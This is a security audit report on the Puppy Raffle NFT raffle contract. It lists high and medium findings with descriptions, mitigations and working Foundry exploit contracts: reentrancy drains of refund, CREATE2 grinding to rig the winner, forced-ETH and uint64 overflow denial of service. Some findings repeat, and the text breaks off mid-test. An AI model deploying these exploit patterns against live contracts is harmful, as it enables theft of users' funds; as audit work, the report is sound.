# 4 puppy raffle audit - Findings Report
## Commit hash: 15c50ec22382bb1f3106aba660e7c590df18dcac

## Protocol Overview 

# Puppy Raffle Protocol

Puppy Raffle is an ERC721-based on-chain raffle that mints a “puppy” NFT to the winner while splitting funds between prize and protocol fees.

How it works:
- Enter: Call enterRaffle(address[] participants) and send msg.value == entranceFee × participants.length. Each unique address becomes a ticket; duplicates are rejected. Multiple unique entries per tx are allowed.
- Refunds: Any participant can self-refund by index to reclaim exactly one entranceFee. The slot is zeroed, leaving holes in the players array.
- Settle: After raffleDuration elapses and there are at least 4 players, anyone may call selectWinner. A pseudo-random index selects the winner. Funds are split 80% to the winner (immediate payout) and 20% to protocol fees (accrued in totalFees). The winner is minted an NFT.
- NFT + Metadata: Rarity (common/rare/legendary) is chosen via a second pseudo-random draw (70/25/5 distribution). tokenURI returns base64-encoded JSON with rarity attributes and IPFS-backed images.
- Fees: withdrawFees sends accumulated fees to feeAddress only when no non-fee funds remain. Owner can change feeAddress.
- Tooling: Foundry tests cover entry, duplicates, refunds, settlement, payouts, NFT minting/URI, and fee withdrawal. A deploy script sets entranceFee (1 ether), duration (1 day), and feeAddress = deployer.
## High Risk Findings
[H-1]. Reentrancy in PuppyRaffle.refund lets a malicious player drain the entire raffle balance before state is cleared
[H-2]. Reentrancy in PuppyRaffle.refund lets a player recursively over-refund and drain the pot
[H-3]. CREATE2 grinding of msg.sender lets attacker deterministically win and steal 80% prize in PuppyRaffle.selectWinner
[H-4]. uint64 totalFees overflow in PuppyRaffle.selectWinner breaks balance==totalFees invariant and bricks withdrawFees
[H-5]. Forced ETH breaks balance==totalFees invariant, permanently DoSing withdrawFees
[H-6]. uint64 totalFees overflow desyncs accounting and DoSes withdrawFees after ~24 rounds
## Medium Risk Findings
[M-1]. Refund-created holes inflate players.length and brick selectWinner, preventing round reset and winner recording
[M-2]. O(n^2) duplicate scan in PuppyRaffle.enterRaffle enables gas-based DoS of new entries
[M-3]. Rounding dust in 80/20 split bricks withdrawFees via strict balance==totalFees check
[M-4]. Duplicate-check includes refunded address(0) entries, permanently DoSing enterRaffle after two refunds
[M-5]. Malicious winner contract can revert receive/onERC721Received to brick selectWinner and halt raffle settlement
[M-6]. selectWinner overestimates pot using players.length causing settlement DoS with refunded holes
[M-7]. selectWinner overcounts refunded slots causing prize>balance and bricking settlement


### Number of Findings
- C: 0
- H: 6
- M: 7
- L: 0
- I: 0



# High Risk Findings

## [H-1]. Reentrancy in PuppyRaffle.refund lets a malicious player drain the entire raffle balance before state is cleared

## Exploit Type
Reentrancy

## Location
PuppyRaffle.refund

## Minimim Privilege Required
Permissionless

## Derived From Pattern/Invariant
GriefableCallbacks

## Description
The refund function performs an external call to the untrusted recipient (msg.sender) before updating state, enabling reentrancy. A malicious contract can reenter refund(playerIndex) repeatedly while players[playerIndex] still equals the attacker, extracting entranceFee each time until the contract balance is exhausted. Vulnerable snippet:

function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, ...);
    require(playerAddress != address(0), ...);
    payable(msg.sender).sendValue(entranceFee); // external call before state update
    players[playerIndex] = address(0);
    emit RaffleRefunded(playerAddress);
}

Because Address.sendValue forwards all gas and no reentrancy guard is present, the attacker’s receive() can recursively call refund with the same index prior to players[playerIndex] = address(0), draining all ETH (pot and any previously accrued fees if present).

## Impact
Direct theft of all ETH held by the contract (prize pool and any fee float) prior to settlement. Honest participants lose the ability to refund/claim as the balance is emptied. Admin intervention cannot recover drained funds.

## Proof of Concept
1) Honest users enter the raffle, funding the contract with N * entranceFee.
2) Attacker deploys a malicious contract and enters once.
3) Attacker calls refund(attackerIndex).
4) During sendValue, attacker’s receive() reenters refund(attackerIndex) while players[attackerIndex] still equals the attacker.
5) Each reentrant call transfers another entranceFee; recursion continues until address(this).balance < entranceFee.
6) Result: contract balance drained to zero; attacker’s net profit ≈ (N * entranceFee) - entranceFee.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {PuppyRaffle} from "src/PuppyRaffle.sol";

contract RefundReentrancyTest is Test {
    PuppyRaffle raffle;
    uint256 entranceFee = 1 ether;
    address feeAddr = address(99);
    uint256 duration = 1 days;
    address p1 = address(1);
    address p2 = address(2);
    address p3 = address(3);
    address p4 = address(4);
    ReentrantAttacker attacker;

    function setUp() public {
        raffle = new PuppyRaffle(entranceFee, feeAddr, duration);

        // Fund this test contract to seed the raffle with 4 honest players
        vm.deal(address(this), 100 ether);
        address[] memory group = new address[](4);
        group[0] = p1; group[1] = p2; group[2] = p3; group[3] = p4;
        raffle.enterRaffle{value: entranceFee * 4}(group);

        // Deploy attacker and enter once
        attacker = new ReentrantAttacker(raffle, entranceFee);
        vm.deal(address(attacker), entranceFee);
        attacker.enter{value: entranceFee}();

        // 5 tickets total => 5 * entranceFee balance
        assertEq(address(raffle).balance, entranceFee * 5, "initial funding mismatch");
    }

    function testRefundReentrancyDrainsAll() public {
        // Attacker is appended after 4 honest players => index = 4
        attacker.attack(4);

        // Contract drained
        assertEq(address(raffle).balance, 0, "raffle not drained");
        // Attacker received all 5 refunds (including honest users' funds)
        assertEq(address(attacker).balance, entranceFee * 5, "attacker balance wrong");
    }
}

contract ReentrantAttacker {
    PuppyRaffle public raffle;
    uint256 public entranceFee;
    uint256 private idx;

    constructor(PuppyRaffle _raffle, uint256 _fee) {
        raffle = _raffle;
        entranceFee = _fee;
    }

    function enter() external payable {
        address[] memory arr = new address[](1);
        arr[0] = address(this);
        raffle.enterRaffle{value: entranceFee}(arr);
    }

    function attack(uint256 index) external {
        idx = index;
        raffle.refund(index);
    }

    receive() external payable {
        // Reenter while enough balance remains for another refund
        if (address(raffle).balance >= entranceFee) {
            raffle.refund(idx);
        }
    }
}

## Suggested Mitigation
Apply Checks-Effects-Interactions and/or a reentrancy guard. Clear the player slot before transferring funds to prevent reentry; optionally add nonReentrant.

Example fix:

function refund(uint256 playerIndex) public nonReentrant {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
    // Effects first
    players[playerIndex] = address(0);
    // Interaction after state change
    payable(msg.sender).sendValue(entranceFee);
    emit RaffleRefunded(playerAddress);
}

Also consider using a pull-withdrawal pattern for refunds to avoid direct callbacks.


## [H-2]. Reentrancy in PuppyRaffle.refund lets a player recursively over-refund and drain the pot

## Exploit Type
Reentrancy

## Location
PuppyRaffle.refund

## Minimim Privilege Required
Permissionless

## Derived From Pattern/Invariant
Reentrancy

## Description
refund makes an external ETH transfer to msg.sender before clearing the player slot, allowing the recipient’s fallback to reenter refund(playerIndex) multiple times while storage still shows them as active. This bypasses the intended one-refund limit and drains more than one entranceFee per ticket.

Vulnerable snippet:

function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

    payable(msg.sender).sendValue(entranceFee); // external call before state update (reenterable)

    players[playerIndex] = address(0);          // effects after interaction
    emit RaffleRefunded(playerAddress);
}

Because there is no nonReentrant guard and players[playerIndex] is only zeroed after the transfer, a malicious contract can recurse in its receive/fallback and call refund repeatedly, extracting multiple entranceFee payouts in a single transaction.

## Impact
An unprivileged participant can drain the contract’s ETH (other players’ deposits) by reentering refund multiple times. This results in direct theft of funds and leaves the raffle insolvent. In a 4-player pot, attacker can receive 4× entranceFee while only entitled to 1×, netting 3× entranceFee profit and zeroing the contract balance.

## Proof of Concept
1) Attacker deploys a malicious contract and enters the raffle once. Three other honest players also enter (4× entranceFee in the pot).
2) Attacker calls refund with their index.
3) During the sendValue transfer, the attacker’s receive() reenters refund(index) repeatedly while players[index] is still the attacker’s address.
4) Each reentry pays another entranceFee to the attacker.
5) After recursion unwinds, players[index] is zeroed once, but multiple refunds have already been paid. The contract balance is drained, and the attacker has net profit > 0.

## Proof of Code
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract ReentrancyAttacker {
    PuppyRaffle public target;
    uint256 public idx;
    uint256 public max;
    uint256 public count;

    constructor(PuppyRaffle _target) {
        target = _target;
    }

    // Join raffle as this contract (player)
    function join() external payable {
        address[] memory arr = new address[](1);
        arr[0] = address(this);
        target.enterRaffle{value: msg.value}(arr);
    }

    function setParams(uint256 _idx, uint256 _max) external {
        idx = _idx;
        max = _max; // number of extra reentrant refunds to perform
    }

    function attack() external {
        // First call triggers reentrancy via receive()
        target.refund(idx);
    }

    receive() external payable {
        if (count < max) {
            count++;
            target.refund(idx);
        }
    }
}

contract RefundReentrancyTest is Test {
    PuppyRaffle raffle;
    uint256 fee = 1 ether;
    address feeAddr = address(99);
    address p1 = address(1);
    address p2 = address(2);
    address p3 = address(3);

    function setUp() public {
        raffle = new PuppyRaffle(fee, feeAddr, 1 days);
    }

    function testRefundReentrancyDrainsPot() public {
        // Three honest players each enter and pay their fee
        vm.deal(p1, fee);
        vm.prank(p1);
        {
            address[] memory arr = new address[](1);
            arr[0] = p1;
            raffle.enterRaffle{value: fee}(arr);
        }
        vm.deal(p2, fee);
        vm.prank(p2);
        {
            address[] memory arr = new address[](1);
            arr[0] = p2;
            raffle.enterRaffle{value: fee}(arr);
        }
        vm.deal(p3, fee);
        vm.prank(p3);
        {
            address[] memory arr = new address[](1);
            arr[0] = p3;
            raffle.enterRaffle{value: fee}(arr);
        }

        // Attacker joins once
        ReentrancyAttacker attacker = new ReentrancyAttacker(raffle);
        vm.deal(address(attacker), 0); // attacker will receive ether from this test call
        attacker.join{value: fee}();

        // Players now: [p1, p2, p3, attacker], pot = 4 * fee, attacker's index = 3
        assertEq(address(raffle).balance, 4 * fee);
        uint256 attackerBalBefore = address(attacker).balance; // 0

        // Configure to perform 3 reentrant extra refunds (total 4 payouts)
        attacker.setParams(3, 3);

        // Execute attack
        attacker.attack();

        // Attacker receives 4 * fee refunds; paid 1 * fee to join => net profit = 3 * fee
        uint256 attackerBalAfter = address(attacker).balance;
        assertEq(attackerBalAfter, 4 * fee);
        assertGt(attackerBalAfter - attackerBalBefore, fee); // strictly more than their rightful 1 * fee

        // Contract drained
        assertEq(address(raffle).balance, 0);
    }
}


## Suggested Mitigation
Apply Checks-Effects-Interactions or a reentrancy guard. Move state update before the external transfer, or add OpenZeppelin ReentrancyGuard and mark refund as nonReentrant.

Example fix (preferred CEI):

function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

    // Effects first
    players[playerIndex] = address(0);

    // Interaction after state change
    payable(msg.sender).sendValue(entranceFee);
}

Or with guard:

import {ReentrancyGuard} from "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
contract PuppyRaffle is ERC721, Ownable, ReentrancyGuard { ... }
function refund(uint256 playerIndex) public nonReentrant { /* current logic */ }


## [H-3]. CREATE2 grinding of msg.sender lets attacker deterministically win and steal 80% prize in PuppyRaffle.selectWinner

## Exploit Type
TimestampDependentLogic

## Location
PuppyRaffle.selectWinner

## Minimim Privilege Required
Permissionless

## Derived From Pattern/Invariant
TimestampOrBlockManipulation

## Description
The winner RNG seeds include caller-controlled and miner-influenced values, allowing an attacker to grind a CREATE2 contract address in the same transaction to force winnerIndex to their entry. Vulnerable snippet:

uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
address winner = players[winnerIndex];

Because block.timestamp and block.difficulty are fixed for the transaction, an attacker can iterate salts to precompute a CREATE2 address whose inclusion in the hash yields a winnerIndex equal to their known index in players. They then deploy that contract and immediately call selectWinner, guaranteeing themselves as winner and redirecting the prize (80% of pot). No commit-reveal or VRF exists, and anyone may call selectWinner.

## Impact
Direct, permissionless fund redirection: attacker guarantees selection as winner and receives 80% of totalAmountCollected. Net profit ≈ 0.8 * (sum of others’ entries) per round. Repeatable across rounds with a single tx per settle.

## Proof of Concept
1) Attacker enters the raffle once; three other users also enter (total 4 players).
2) After raffleDuration elapses, attacker uses a factory contract to brute-force a CREATE2 salt that yields a predicted contract address such that keccak(msg.sender=predicted, block.timestamp, block.difficulty) % players.length == attackerIndex.
3) In the same transaction, factory deploys that contract and calls selectWinner from it.
4) winnerIndex selects attacker’s array index, paying out 80% of the pot to attacker.
5) Assert previousWinner == attacker and attacker’s balance increases by prize - entranceFee.

## Proof of Code
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract SelectWinnerCaller {
    PuppyRaffle public raffle;
    constructor(PuppyRaffle _raffle) { raffle = _raffle; }
    function callSelectWinner() external { raffle.selectWinner(); }
}

contract AttackFactory {
    function _computeCreate2(bytes32 salt, bytes memory bytecode) internal view returns (address) {
        bytes32 h = keccak256(abi.encodePacked(bytes1(0xff), address(this), salt, keccak256(bytecode)));
        return address(uint160(uint256(h)));
    }

    function attackWin(PuppyRaffle raffle, uint256 playersLength, uint256 attackerIndex) external {
        bytes memory code = abi.encodePacked(type(SelectWinnerCaller).creationCode, abi.encode(raffle));
        for (uint256 i = 0; i < 200000; i++) {
            bytes32 salt = bytes32(i);
            address predicted = _computeCreate2(salt, code);
            uint256 idx = uint256(keccak256(abi.encodePacked(predicted, block.timestamp, block.difficulty))) % playersLength;
            if (idx == attackerIndex) {
                SelectWinnerCaller c = new SelectWinnerCaller{salt: salt}(raffle);
                c.callSelectWinner();
                return;
            }
        }
        revert("no salt found");
    }
}

contract ExploitWinTest is Test {
    PuppyRaffle raffle;
    uint256 constant FEE = 1 ether;
    address attacker = address(0xA11CE);
    address p2 = address(0xB2);
    address p3 = address(0xB3);
    address p4 = address(0xB4);

    function setUp() public {
        raffle = new PuppyRaffle(FEE, address(99), 1 days);
        vm.deal(attacker, 100 ether);
        vm.deal(p2, 100 ether);
        vm.deal(p3, 100 ether);
        vm.deal(p4, 100 ether);

        address[] memory one = new address[](1);
        one[0] = attacker; vm.prank(attacker); raffle.enterRaffle{value: FEE}(one);
        one[0] = p2;       vm.prank(p2);       raffle.enterRaffle{value: FEE}(one);
        one[0] = p3;       vm.prank(p3);       raffle.enterRaffle{value: FEE}(one);
        one[0] = p4;       vm.prank(p4);       raffle.enterRaffle{value: FEE}(one);
        vm.warp(block.timestamp + 1 days + 1);
    }

    function testAttackWinByCreate2Grinding() public {
        uint256 beforeBal = attacker.balance; // already reflects having paid the entrance fee in setUp
        AttackFactory f = new AttackFactory();
        // Attacker is at index 0 (entered first)
        vm.prank(attacker);
        f.attackWin(raffle, 4, 0);

        uint256 pot = FEE * 4;
        uint256 prize = (pot * 80) / 100;

        assertEq(raffle.previousWinner(), attacker);
        // Attacker should have their balance increased by the prize
        assertEq(attacker.balance, beforeBal + prize);
    }
}

## Suggested Mitigation
Do not use msg.sender, block.timestamp, or block.difficulty/prevrandao directly for randomness. Use a commit-reveal or Chainlink VRF. Example (VRF-style):

// Pseudocode
function selectWinner() external {
    require(block.timestamp >= raffleStartTime + raffleDuration);
    require(players.length >= 4);
    bytes32 reqId = vrf.requestRandomWords(...);
    pendingRoundId = reqId;
}

function fulfillRandomWords(bytes32 reqId, uint256[] memory rand) internal override {
    require(reqId == pendingRoundId);
    uint256 winnerIndex = rand[0] % players.length;
    uint256 rarityRoll = rand[1] % 100;
    // proceed with payouts & mint
}

At minimum, remove msg.sender from RNG and avoid immediate-settlement using in-block values; if using prevrandao, combine with a future-block delay and user commits to prevent grinding.


## [H-4]. uint64 totalFees overflow in PuppyRaffle.selectWinner breaks balance==totalFees invariant and bricks withdrawFees

## Exploit Type
AccountingInvariantViolation

## Location
PuppyRaffle.selectWinner

## Minimim Privilege Required
Permissionless

## Derived From Pattern/Invariant
AccountingInvariantViolation

## Description
PuppyRaffle accounts protocol fees in a 64-bit accumulator and truncates a 256-bit per-round fee before adding, without overflow checks (Solidity 0.7.x). This silently wraps at 2^64 and desynchronizes on-chain fee balance from the recorded totalFees, permanently breaking the withdraw precondition require(address(this).balance == uint256(totalFees)). Vulnerable snippet:

uint64 public totalFees;
...
uint256 totalAmountCollected = players.length * entranceFee;
uint256 fee = (totalAmountCollected * 20) / 100;
totalFees = totalFees + uint64(fee); // unchecked add + truncation to 64 bits

With typical settings (entranceFee = 1 ether, 4 players), each round accrues 0.8 ether in fees. After 24 rounds, fees exceed 2^64-1 wei (~18.4467 ETH), causing totalFees to wrap to a much smaller value while the contract balance holds the true fees (e.g., ~19.2 ETH). The invariant balance == totalFees is then permanently false, so withdrawFees always reverts.

## Impact
Permanent bricking of protocol fee withdrawals. All accrued and future fees remain locked in the contract, denying revenue to the protocol. The mismatch persists forever since totalFees (uint64) is F mod 2^64 while contract balance is F, so the equality check can never be satisfied again.

## Proof of Concept
1) Attacker sponsors minimal rounds with 4 unique addresses per round (duplicates not allowed) paying entranceFee*4. 2) After raffleDuration, attacker calls selectWinner, accruing 20% of the pot as fees. 3) Repeat ~24 rounds (with entranceFee=1 ether), accruing ~19.2 ETH of fees, exceeding uint64 max (~18.4467 ETH). 4) totalFees wraps to ~0.7533 ETH while the contract balance holds the true ~19.2 ETH. 5) Calling withdrawFees reverts due to require(address(this).balance == uint256(totalFees)); the invariant is permanently broken and cannot be recovered.

## Proof of Code
pragma solidity ^0.8.20;\n\nimport "forge-std/Test.sol";\nimport "src/PuppyRaffle.sol";\n\ncontract OverflowFeesTest is Test {\n    PuppyRaffle raffle;\n    address attacker = address(0xA11CE);\n    address feeRecipient = address(0xFEe);\n    address[4] tickets = [address(1), address(2), address(3), address(4)];\n    uint256 entranceFee = 1 ether;\n    uint256 duration = 1;\n\n    function setUp() public {\n        raffle = new PuppyRaffle(entranceFee, feeRecipient, duration);\n        vm.deal(attacker, 200 ether);\n    }\n\n    function test_TotalFeesOverflowBricksWithdraw() public {\n        // 24 rounds of 4 players -> 24 * (4 * 1e18 * 20 / 100) = 19.2 ether in fees (> 2^64-1 wei)\n        for (uint256 r = 0; r < 24; r++) {\n            address[] memory addrs = new address[](4);\n            addrs[0] = tickets[0];\n            addrs[1] = tickets[1];\n            addrs[2] = tickets[2];\n            addrs[3] = tickets[3];\n\n            vm.prank(attacker);\n            raffle.enterRaffle{value: entranceFee * 4}(addrs);\n\n            vm.warp(block.timestamp + duration);\n            vm.prank(attacker);\n            raffle.selectWinner();\n        }\n\n        uint256 contractBal = address(raffle).balance;\n        uint256 totalFeesUint = uint256(raffle.totalFees());\n\n        // Expected fee held in contract: 24 * (4 * 1 ether * 20 / 100) = 19.2 ether\n        uint256 expected = 24 * ((4 * entranceFee * 20) / 100);\n        assertEq(contractBal, expected, "contract balance should equal real fees accrued");\n        // Invariant broken: totalFees (uint64 wrapped) != real balance\n        assertGt(contractBal, totalFeesUint, "wrapped totalFees is less than actual balance");\n\n        // Withdraw is permanently bricked due to invariant mismatch\n        vm.expectRevert(bytes("PuppyRaffle: There are currently players active!"));\n        raffle.withdrawFees();\n    }\n}\n

## Suggested Mitigation
Use a 256-bit accumulator for fees and avoid truncation. On Solidity >=0.8, native overflow checks prevent wrap; on 0.7.x use SafeMath. Example fix: change totalFees to uint256 and add without casting. Optionally, track an explicit "no active players" state rather than relying on balance==totalFees.\n\nDiff:\n-   uint64 public totalFees = 0;\n+   uint256 public totalFees = 0;\n...\n-   uint256 fee = (totalAmountCollected * 20) / 100;\n-   totalFees = totalFees + uint64(fee);\n+   uint256 fee = (totalAmountCollected * 20) / 100;\n+   totalFees = totalFees + fee;\n...\n-   require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");\n+   require(address(this).balance == totalFees, "PuppyRaffle: There are currently players active!");


## [H-5]. Forced ETH breaks balance==totalFees invariant, permanently DoSing withdrawFees

## Exploit Type
AccountingInvariantViolation

## Location
PuppyRaffle.withdrawFees

## Minimim Privilege Required
Permissionless

## Derived From Pattern/Invariant
AccountingInvariantViolation

## Description
withdrawFees gates fee payout on a fragile accounting invariant that assumes address(this).balance == totalFees, to infer no player funds are present:

function withdrawFees() external {
    require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
    uint256 feesToWithdraw = totalFees;
    totalFees = 0;
    (bool success,) = feeAddress.call{value: feesToWithdraw}("");
    require(success, "PuppyRaffle: Failed to withdraw fees");
}

Anyone can force-send ETH to the contract (e.g., via selfdestruct), making balance > totalFees without any active players. This permanently falsifies the equality guard, bricking all future fee withdrawals. The protocol has no sweep path for excess ETH and no way to restore equality, causing a permanent fee lock.

## Impact
Permanent freezing of protocol revenue: a single forced-ETH grief (as little as 1 wei) renders withdrawFees unusable indefinitely, stranding all accrued fees. Affects all future rounds and all fee accruals until a migration.

## Proof of Concept
1) Normal flow: 4 players enter; after duration, selectWinner runs; prize paid; fees accrued in totalFees; contract balance == totalFees.
2) Attacker deploys a contract and selfdestructs to PuppyRaffle with 1 wei.
3) Now address(this).balance == totalFees + 1 wei. withdrawFees reverts forever with "There are currently players active!" even though no players are active. Fees are permanently stuck.

## Proof of Code
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {PuppyRaffle} from "src/PuppyRaffle.sol";

contract ForceSend {
    function boom(address payable target) external {
        selfdestruct(target);
    }
}

contract WithdrawFeesForcedETHDoSTest is Test {
    PuppyRaffle raffle;
    address feeAddr = address(99);
    uint256 entranceFee = 1 ether;
    uint256 duration = 1;
    address attacker = address(111);

    function setUp() public {
        raffle = new PuppyRaffle(entranceFee, feeAddr, duration);
        vm.deal(address(this), 100 ether);
        vm.deal(attacker, 1 ether);
        vm.deal(feeAddr, 0);
    }

    function _enterFour() internal {
        address[] memory ps = new address[](4);
        ps[0] = address(1);
        ps[1] = address(2);
        ps[2] = address(3);
        ps[3] = address(4);
        raffle.enterRaffle{value: 4 * entranceFee}(ps);
    }

    function _settle() internal {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);
        raffle.selectWinner();
    }

    function test_ForceETHBricksWithdrawFees() public {
        _enterFour();
        _settle();

        uint256 tf = raffle.totalFees();
        assertEq(address(raffle).balance, tf, "pre: balance should equal totalFees");
        assertEq(feeAddr.balance, 0, "pre: fee recipient starts at 0");

        // Attacker forces 1 wei into raffle via selfdestruct
        ForceSend fs = new ForceSend();
        vm.deal(address(fs), 1);
        vm.prank(attacker);
        fs.boom(payable(address(raffle)));

        // Invariant broken: balance > totalFees
        assertGt(address(raffle).balance, uint256(raffle.totalFees()));

        // withdrawFees now permanently reverts
        vm.expectRevert(bytes("PuppyRaffle: There are currently players active!"));
        raffle.withdrawFees();

        // Fees remain stuck and unpaid
        assertEq(feeAddr.balance, 0, "fees remain stuck after attack");
    }
}


## Suggested Mitigation
- Decouple fee-withdrawal eligibility from raw ETH balance. Guard on raffle state (e.g., players.length == 0) and sufficiency of funds, not strict equality. Also upgrade totalFees to uint256 and optionally add a sweep for excess ETH.

Example fix:

function withdrawFees() external {
    require(players.length == 0, "Players active");
    uint256 feesToWithdraw = uint256(totalFees); // make totalFees uint256 to avoid overflow
    require(address(this).balance >= feesToWithdraw, "Insufficient balance");
    totalFees = 0;
    (bool ok,) = feeAddress.call{value: feesToWithdraw}("");
    require(ok, "withdraw failed");
}

// Optional: allow owner to sweep only surplus ETH when no raffle is active
function sweepExcessETH() external onlyOwner {
    require(players.length == 0, "Players active");
    uint256 excess = address(this).balance - totalFees;
    (bool ok,) = feeAddress.call{value: excess}("");
    require(ok, "sweep failed");
}


## [H-6]. uint64 totalFees overflow desyncs accounting and DoSes withdrawFees after ~24 rounds

## Exploit Type
AccountingInvariantViolation

## Location
PuppyRaffle.withdrawFees

## Minimim Privilege Required
Permissionless

## Derived From Pattern/Invariant
AccountingInvariantViolation

## Description
totalFees is stored as uint64 and increased each settlement:

uint64 public totalFees;
...
uint256 fee = (totalAmountCollected * 20) / 100;
totalFees = totalFees + uint64(fee);

In withdrawFees an equality gate requires address(this).balance == uint256(totalFees). After ~24 rounds with entranceFee=1e18 and 4 players, accumulated fees (~19.2 ETH) exceed 2^64-1 wei (~18.4467 ETH). totalFees wraps, but the contract balance correctly holds the full (unwrapped) ETH, violating the equality guard and permanently bricking withdrawals.

## Impact
Once cumulative fees exceed 2^64-1 wei, totalFees wraps while the contract balance continues growing, making address(this).balance == totalFees permanently false. This permanently bricks fee withdrawals and irretrievably locks protocol revenue on-chain. No on-chain recovery is possible without migration; normal operations can trigger this state permissionlessly.

## Proof of Concept
1) Repeatedly run raffle rounds permissionlessly: enter 4 players with correct payment, wait duration, selectWinner; repeat 24 times (with entranceFee=1e18).
2) Contract ETH balance equals the sum of all fees (~19.2 ETH). totalFees (uint64) wraps to ~0.753... ETH.
3) withdrawFees require(balance == totalFees) fails, locking all fees.

## Proof of Code
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {PuppyRaffle} from "src/PuppyRaffle.sol";

contract TotalFeesOverflowDoSTest is Test {
    PuppyRaffle raffle;
    address feeAddr = address(99);
    uint256 entranceFee = 1 ether;
    uint256 duration = 1;

    function setUp() public {
        raffle = new PuppyRaffle(entranceFee, feeAddr, duration);
        vm.deal(address(this), 1000 ether);
    }

    function _enterFour() internal {
        address[] memory ps = new address[](4);
        ps[0] = address(1);
        ps[1] = address(2);
        ps[2] = address(3);
        ps[3] = address(4);
        raffle.enterRaffle{value: 4 * entranceFee}(ps);
    }

    function _settle() internal {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);
        raffle.selectWinner();
    }

    function test_totalFeesUint64OverflowBricksWithdraw() public {
        uint256 rounds = 24; // 24 * 0.8 ETH = 19.2 ETH > 2^64-1 wei (~18.4467 ETH)
        uint256 expectedTotalFees;
        uint256 feePerRound = (4 * entranceFee * 20) / 100; // 0.8 ETH

        for (uint256 i = 0; i < rounds; i++) {
            _enterFour();
            _settle();
            expectedTotalFees += feePerRound;
        }

        // Sanity: fees accumulated exceed uint64 cap
        assertGt(expectedTotalFees, uint256(type(uint64).max), "threshold not crossed");

        // Contract holds the full (unwrapped) fees
        assertEq(address(raffle).balance, expectedTotalFees, "contract balance should equal unwrapped fees");

        // On-chain accounting wrapped to uint64
        uint256 accounted = raffle.totalFees();
        assertEq(accounted, uint64(expectedTotalFees), "on-chain accounting wrapped to uint64");
        assertTrue(address(raffle).balance != accounted, "balance != totalFees after overflow");

        // Withdraw is now permanently bricked by strict equality gate
        vm.expectRevert();
        raffle.withdrawFees();

        assertEq(feeAddr.balance, 0, "no fees paid due to overflow-bricked withdrawal");
    }
}


## Suggested Mitigation
- Store totalFees as uint256 to avoid overflow.
- Remove strict equality gating. Instead, gate by raffle state and sufficiency of balance; e.g., require(players.length == 0) and require(address(this).balance >= totalFees). Then transfer exactly totalFees and reset it to 0.
- Optionally add an owner-only sweep for accidental excess ETH when no raffle is active.

Example:
- change: uint64 public totalFees; -> uint256 public totalFees;
- in selectWinner: totalFees += fee; (no cast)
- in withdrawFees:
  require(players.length == 0, "Players active");
  uint256 feesToWithdraw = totalFees;
  require(address(this).balance >= feesToWithdraw, "Insufficient balance");
  totalFees = 0;
  (bool ok,) = feeAddress.call{value: feesToWithdraw}("");
  require(ok, "withdraw failed");




# Medium Risk Findings

## [M-1]. Refund-created holes inflate players.length and brick selectWinner, preventing round reset and winner recording

## Exploit Type
AccountingInvariantViolation

## Location
PuppyRaffle.selectWinner

## Minimim Privilege Required
Permissionless

## Derived From Pattern/Invariant
StateMachine

## Description
selectWinner assumes every slot in players paid and is active, computing the pot from players.length. Refunded entries leave address(0) holes and do not shrink the array. An attacker can repeatedly enter then refund to arbitrarily inflate players.length without adding funds. At settlement, totalAmountCollected = players.length * entranceFee and prizePool = 80% will exceed the contract’s actual balance and the value-transfer reverts. Because delete players; raffleStartTime = block.timestamp; previousWinner = winner; happen before the external transfer but the whole tx reverts, the round cannot settle, reset, or record a winner. Vulnerable snippet:

function selectWinner() external {
    require(block.timestamp >= raffleStartTime + raffleDuration, ...);
    require(players.length >= 4, ...);
    uint256 winnerIndex = ... % players.length;
    address winner = players[winnerIndex];
    uint256 totalAmountCollected = players.length * entranceFee;
    uint256 prizePool = (totalAmountCollected * 80) / 100;
    uint256 fee = (totalAmountCollected * 20) / 100;
    totalFees = totalFees + uint64(fee);
    ...
    delete players;
    raffleStartTime = block.timestamp;
    previousWinner = winner;
    (bool success,) = winner.call{value: prizePool}(""); // reverts when prizePool > balance
    require(success, ...);
    _safeMint(winner, tokenId);
}

## Impact
Any user can inflate players.length by entering and then refunding, creating address(0) holes while keeping the contract balance unchanged. selectWinner uses players.length to compute totalAmountCollected and prizePool, so even a small number of holes makes prizePool exceed the actual balance and the value transfer reverts. Because the transaction reverts, no state progresses (players are not cleared, raffleStartTime is not advanced, previousWinner is not set). This permanently bricks settlement for the round and all subsequent attempts until the contract is forcibly topped up (e.g., via selfdestruct) to cover players.length × entranceFee. Player refunds do not fix the issue (they lower balance but do not reduce players.length), and fees remain locked (withdrawFees cannot succeed).

## Proof of Concept
1) Four honest players enter with 1 ether each (players.length = 4, balance = 4 ether).
2) Attacker repeats: enter with a fresh address (1 ether), then immediately refunds from that address. This grows players.length but returns the ether, leaving a zeroed slot. Repeat N times; now players.length = 4 + N, balance still ~4 ether.
3) After duration elapses, attacker (or anyone) calls selectWinner. The contract computes totalAmountCollected = (4+N) ether and prizePool = 80% of that, which exceeds the 4 ether balance. The call to send prizePool reverts, so state changes (delete players, raffleStartTime update, previousWinner) are rolled back. Settlement is bricked; the round cannot reset or record a winner.

## Proof of Code
pragma solidity ^0.8.18;

import "forge-std/Test.sol";
import {PuppyRaffle} from "src/PuppyRaffle.sol";

contract DoSSettlementViaRefundHolesTest is Test {
